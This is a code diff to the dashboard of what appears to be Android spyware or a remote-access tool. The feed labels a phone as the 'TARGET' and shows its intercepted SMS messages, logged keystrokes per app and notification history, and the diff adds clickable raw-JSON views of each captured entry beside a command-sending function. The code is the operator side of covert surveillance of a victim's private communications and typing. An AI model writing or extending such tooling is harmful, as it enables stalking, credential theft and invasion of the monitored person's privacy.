@@ -493,17 +493,33 @@
             const container = document.getElementById('feed-container');
             document.getElementById('feed-target-label').innerText = `// TARGET: ${dev.device_model}`;
             const logs = [];
-            if (dev.sms_logs) dev.sms_logs.forEach(x => logs.push({tag:'SMS', val:x.body, ts:x.timestamp || dev.created_at, col:'var(--success)'}));
-            if (dev.typing_history) dev.typing_history.forEach(x => logs.push({tag:'KEY', val:`[${x.pkg}] ${x.txt}`, ts:x.end_ts || dev.created_at, col:'var(--primary)'}));
-            if (dev.notif_history) dev.notif_history.forEach(x => logs.push({tag:'NTF', val:`${x.pkg}: ${x.title}`, ts:x.ts || dev.created_at, col:'var(--secondary)'}));
+            if (dev.sms_logs) dev.sms_logs.forEach(x => logs.push({tag:'SMS', val:x.body || 'Empty Body', ts:x.timestamp || dev.created_at, col:'var(--success)', raw: x}));
+            if (dev.typing_history) dev.typing_history.forEach(x => logs.push({tag:'KEY', val:`[${x.pkg}] ${x.txt}`, ts:x.end_ts || dev.created_at, col:'var(--primary)', raw: x}));
+            if (dev.notif_history) dev.notif_history.forEach(x => logs.push({tag:'NTF', val:`${x.pkg}: ${x.title}`, ts:x.ts || dev.created_at, col:'var(--secondary)', raw: x}));
             
             logs.sort((a,b) => b.ts - a.ts);
-            container.innerHTML = logs.slice(0, 25).map(l => `
-                <div class="log-entry">
-                    <div><span class="log-tag" style="color:${l.col}">[${l.tag}]</span> ${l.val.substring(0,40)}</div>
-                    <div class="log-time">${new Date(l.ts).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
+            container.innerHTML = logs.slice(0, 25).map((l, i) => `
+                <div class="log-entry" style="flex-direction: column; cursor: pointer; align-items: stretch;" onclick="toggleFeedDetail('feed-log-${i}')">
+                    <div style="display: flex; justify-content: space-between; width: 100%;">
+                        <div style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                            <span class="log-tag" style="color:${l.col}">[${l.tag}]</span> 
+                            ${l.val.substring(0,40)}${l.val.length > 40 ? '...' : ''}
+                        </div>
+                        <div class="log-time" style="display:flex; align-items:center; gap:5px;">
+                            ${new Date(l.ts).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}
+                            <span style="color:var(--primary); font-size:0.5rem; opacity:0.3;">▼</span>
+                        </div>
+                    </div>
+                    <div id="feed-log-${i}" style="display: none; margin-top: 10px; padding: 10px; background: #000; border: 1px solid #222; overflow: auto; pointer-events: auto;" onclick="event.stopPropagation()">
+                        <pre style="margin: 0; white-space: pre-wrap; font-size: 0.65rem; color: var(--success); font-family: 'Share Tech Mono', monospace;">${JSON.stringify(l.raw, null, 2)}</pre>
+                    </div>
                 </div>
             `).join('') || '<div style="text-align:center; color:#444">Idle</div>';
+        }
+
+        function toggleFeedDetail(id) {
+            const el = document.getElementById(id);
+            el.style.display = el.style.display === 'none' ? 'block' : 'none';
         }
 
         async function sendCmd(type, forcedVal = null) {
